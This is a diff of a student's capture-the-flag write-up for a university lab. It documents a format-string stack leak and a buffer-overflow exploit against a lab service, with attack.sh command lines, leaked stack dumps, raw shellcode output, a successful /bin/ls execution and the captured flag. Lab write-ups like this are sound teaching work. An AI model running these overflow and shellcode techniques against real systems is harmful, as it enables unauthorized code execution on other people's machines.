@@ -1,4 +1,4 @@
-# Exercise 2
+# Exercise 2, Smashing the stack for fun and profit
 ## Jakob Udovic, s1049877
 
 https://www.rapidtables.com/convert/number/hex-to-ascii.html  
@@ -26,10 +26,7 @@ List/shell code is 33 bytes long.
 75 - 11 = 64  
 
 So we change attack from `./attack.sh 75 0x123456789abc` to `./attack.sh 64 0x123456789abc 0`  
-```
 
-
-```
 But address has still 20 at the end. I solve this by shortening the string from 231 bytes to 230. I get the following:  
 `./attack.sh 63 0x123456789abc 2`  
 Now it's time to use real addresses, I just used 0x123456789abc for easier tracking in terminal..   
@@ -37,12 +34,11 @@ Now it's time to use real addresses, I just used 0x123456789abc for easier track
 
 0x7ffff7f60070   
 
+```
 ./attack.sh 63 0x7ffff7f60070 2
 ```
 
-```
-
-Candidates:
+Candidates for the variable on the stack/frame pointer where our input gets stored by the function `gets()`:  
 0x7fffffffec00 (fp1)  
 0x7fffffffec68 (fp2)  
 0x7fffffffec10 (fp3?)  
@@ -53,46 +49,31 @@ Candidates:
 0x7fffffffee50 (fp dont even count anymore)  
 0x7fffffffee5e (buffer start?)
 
-Temporal calculation:  
+Temporary calculation:  
 String needs to be 189B.  
 `./attack.sh 61 0x123456789abc`  
 is the same as  
 `./attack.sh 50 0x123456789abc 0`  
+since the shell code is 33B long.  
 
 We need to add 1 byte of offset to completely override first return address:  
 `./attack.sh 50 0x123456789abc 1`  
 
+Brute forcing did not work:  
+./attack.sh 50 0x7fffffffee5e 1  
+./attack.sh 50 0x7fffffffec00 1  
+./attack.sh 50 0x7fffffffec68 1  
+./attack.sh 50 0x7fffffffec10 1  
+./attack.sh 50 0x7ffff7f851f5 1 ?  
+./attack.sh 50 0x7ffff7f851ce 1    
+./attack.sh 50 0x7fffffffec50 1  
+./attack.sh 50 0x7ffff7ffdd48 1  
+./attack.sh 50 0x7fffffffee50 1  
+./attack.sh 50 0x7fffffffee5e 1  
+./attack.sh 50  1  
+./attack.sh 50  1  
 
-./attack.sh 50 0x7fffffffee5e 1
-./attack.sh 50 0x7fffffffec00 1
-./attack.sh 50 0x7fffffffec68 1
-./attack.sh 50 0x7fffffffec10 1
-./attack.sh 50 0x7ffff7f851f5 1 ?
-./attack.sh 50 0x7ffff7f851ce 1
-./attack.sh 50 0x7fffffffec50 1
-./attack.sh 50 0x7ffff7ffdd48 1
-./attack.sh 50 0x7fffffffee50 1
-./attack.sh 50 0x7fffffffee5e 1
-./attack.sh 50  1
-./attack.sh 50  1
-
-Bunch of crap on the stack:  
-0x7fffffffee5e  
-0x7fffffffeea0   
-0x7fffffffeeab  
-0x7fffffffef06  
-0x7fffffffef1a  
-0x7fffffffef26  
-0x7fffffffef2c  
-0x7fffffffef3f  
-0x7fffffffef46  
-0x7fffffffef54  
-0x7fffffffef62  
-0x7fffffffef78  
-0x7fffffffef87  
-0x7fffffffefa4  
-0x7fffffffefb8  
-0x7fffffffefd5  
+---
 
 
 By further observing stack and flipping values as in exercise 3 I found:  
@@ -127,23 +108,19 @@ SOCAT_PEERPORT=33638
 /bin/vulnserv
 ```
 
-Those are environmental variables and I should ignore them... The result is not in here.  
+I guess I was printing too much since those are environmental variables. I should ignore them... The result is not in here, sadly. But that PADDING value, as well as IPs with ports looked suspicious to me for quite some time (more about that later).  
 
 
+I went back to the stack, where I tried to print it whole, by feeding it different number of %ps.    
+The method of flooding the stack with them and seeing, which address remains the same and therefore finding the location of our unknown variable did not work as in the previous assignment.  
 
-Just the stack 40B:  
+I now printed the whole stack and draw it on piece of paper as well as here:  
 ```
-0x70252070252070 0 0 0 0 0 0 0x555555555257 0x7fffffffec00 0x555555555247 0x7fffffffec68 0x100000000 0x7fffffffec10 0x555555555260 0x1 0x7ffff7f851f5 0x7ffff7f851ce 0x7fffffffec50 0 0xf8 0x7ffff7ffdd48
-```
-
-
-
-```
-0x7ffff7ffc528 0 0 0x7ffff7ffda40 0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x70 0 0 0 0 0 0 0 0 0 0x555555555257 0x7fffffffec00 0x555555555247 0x7fffffffec68
-```
-
-Stack after inputing 149B (50x %p):  
-```
+0x7ffff7ffdac0
+0 
+0 
+0x590 
+0 0 0 0 0 0 0 0 0 
 0x555555555257 
 0x7fffffffec00 
 0x555555555247 
@@ -155,7 +132,8 @@ Stack after inputing 149B (50x %p):
 0x7ffff7f851f5 
 0x7ffff7f851ce 
 0x7fffffffec50 
-0 0xf8  
+0 
+0xf8 
 0x7ffff7ffdd48 
 0x55555555509e 
 0x1 
@@ -211,7 +189,7 @@ Stack after inputing 149B (50x %p):
 0x19 
 0x7fffffffee39 
 0x1a 
-0 0x555555555257
+0 
 0x1f 
 0x7fffffffefea 
 0xf 
@@ -219,64 +197,106 @@ Stack after inputing 149B (50x %p):
 0
 0 
 0 
----- environmental variables ---- 
-0x234fa152bd58e100 
-0xf6af409312c9ddd8 
-0x34365f36387897 
-0x75762f6e69622f00 
-0x5000767265736e6c 
-0x7273752f3d485441 
-0x732f6c61636f6c2f 
-0x7273752f3a6e6962
 ```
 
+On the 15th place is the stack variable, which was suspicious `0x7ffff7ffdac0`. 
 
-The service accepts 1231B long string (all A-s), but does not respond when fed 1232B.   
+After that, for quite some time, there was nothing. I would assume that is because we need some space for buffer.  
 
+The first thing after that (27th place) is a HEAP address. This was weird to me, since I expected something like in 5th assignment of the pattern:  
+`stack, stack, heap`  
+Which would correspond to:  
+`variable, frame pointer, return address`.  
+In the whole stack I could not find anything similar to this...   
+That's unfortunate since I thoght Thom will make a challenge harder by just nesting some functions to hide the address.  
 
+---
 
-We feed 56x "%p " To not overrite the stack and get:  
+After failing to find the pattern, I thought there could be a canary exploit.  
+
+I tried figuring out how to insert a null byte but soon realized, there are needed 2 separate buffer overflows for that.  
+
+I gave up on the challenge **here** and started writing this report.  
+
+Then I notice I wrote this:  
 ```
-0x555555555257 0x7fffffffec00 0x555555555247 0x7fffffffec68 0x100000000 0x7fffffffec10 0x555555555260 0x1 0x7ffff7f851f5 0x7ffff7f851ce 0x7fffffffec50 0 0xf8 0x7ffff7ffdd48 0x55555555509e 0x1 0x7fffffffee54 0 0x7fffffffee62 0x7fffffffeea4 0x7fffffffeeaf 0x7fffffffef0a 0x7fffffffef1e 0x7fffffffef2a 0x7fffffffef30 0x7fffffffef43 0x7fffffffef4a 0x7fffffffef58 0x7fffffffef66 0x7fffffffef7c
-```
-
-
-
-Where our value is stored, candidates:  
-```
-0x7fffffffec00  
-0x7fffffffec68
-```
-
-Override the `0x555555555260` which is behind the canary `0x100000000`. Keep that!!  
-
-
-So, fake address, 6B, has to be on top. `0x123456789ABC` So we know what's going on, where it is.  
-After that, we don't care? about  the frame pointer, but watch out on the canary value, has to be `0x100000000`. How do we insert null bytes?  
-
-0x100000000 - canary?  
-
-
-
-Plan B:
-```
-0x7ffff7f851f5 0x7ffff7f851ce 0x7fffffffec50 0 0xf8 0x7ffff7ffdd48 0x55555555509e
-```
- 
-
-
+There are first 5 values that are register values, which we normally ignore.  
+I mean could the variable location be stored here? Probably not in our case...  
 ```
 
+Then it hit me. Since I already tried to brute force most of the combinations, a couple more won't hurt?   
+So: let's try to use these addresses anyway for the exploit of the first return address/heap address we see.   
 
+Candidates: 0x7ffff7ffc528 and 0x7ffff7ffda40 (non-zero register values)  
 
+First, I tried my dummy `0x123456789ABC` address to easier locate the length of the attack string to overwrite the return address.  
+```
+./attack.sh 45 0x123456789abc 0
+* [DEBUG] ./shellcode printed 33 bytes
+Attackstring is 174 bytes
+H1�H1�H�//bin/lsH�SH��RWH��;0x7ffff7ffc528 0 0 0x7ffff7ffda40 0 0xbb48d23148c03148 0x736c2f6e69622f2f 0xe789485308ebc148 0xf3bb0e689485752 0x2520702520702505 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x123456789abc 0x7fffffffec00 0x555555555247 0x7fffffffec68 0x100000000 0x7fffffffec10 0x555555555260 0x1 0x7ffff7f851f5 0x7ffff7f851ce 0x7fffffffec50 0 0xf8 0x7ffff7ffdd48 0x55555555509e 0x1 0x7fffffffee50 0 0x7fffffffee5e ��xV4
 ```
 
+Turns out, the string should be 174B long.  
+Now, I can use my candidates.  
 
+This return address did not work. Let's try find and overwrite the next one: `0x555555555247`.  
+
+This worked with the first candidate aka the address in the first register.  
+The process od locating the variable of our input was the same as before, so I will omit it and just paste the result:  
+
+```
+./attack.sh 50 0x7ffff7ffc528 1
+* [DEBUG] ./shellcode printed 34 bytes
+Attackstring is 190 bytes
+�H1�H1�H�//bin/lsH�SH��RWH��;0x7ffff7ffc528 0 0 0x7ffff7ffda40 0 0x48d23148c0314890 0x6c2f6e69622f2fbb 0x89485308ebc14873 0x3bb0e689485752e7 0x207025207025050f 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7ffff7ffc528 0x7fffffffec68 0x100000000 0x7fffffffec10 0x555555555260 0x1 0x7ffff7f851f5 0x7ffff7f851ce 0x7fffffffec50 0 0xf8 0x7ffff7ffdd48 0x55555555509e 0x1 0x7fffffffee50 0 0x7fffffffee5e 0x7fffffffeea0 0x7fffffffeeab 0x7fffffffef06 0x7fffffffef1a 0x7fffffffef26 (����
+FLAG
+bin
+dev
+etc
+home
+lib
+media
+mnt
+opt
+proc
+root
+run
+sbin
+src
+srv
+sys
+tmp
+usr
+var
+```
+
+As we can see, the code was sucessfully executed! FINALLY! Days of hard work were paid off...  
+Now, I just had to change the code from the `list` to `shell` in the script aka utilities, that were kindly provided to us, the same we did for the assignment 5.   
+
+
+Conclusion: I hate myslef and my thinking process. I could try the dumbest things first and save myself a lot of grey hair and wrinkles.  
+I hope at least this writeup is good enough. I do not know what else to say, I dived into trying to connect to a new host when I saw IPs and ports in the environmental variables. I tried to overcome my imaginary canaries. I tried everything.  
+The good thing is, it's over and that's what matters.  
+
+Have a nice day. 
+
+--- 
+
+Some calculations on how I was calculating the attack string lengths:
+```
+285B long string, need 1 more B, so I need nops.  
+285B - 6B address = 279B of "%p "  
+279 / 3 = 93x "%p "  
+279B - 33B (that's an attack string) = 246B  
+246 / 3 = 82x "%p "  
+```
 
 
 
 Flag:  
 ```
-
+cat /FLAG
+HiCCTF{PyiTvuGWCHNbZTz0AwzCPWVAZotbsbW6lOKahkgCykGLRRyzyweJ0PEns7YJvBwH}
 ```
- 
+
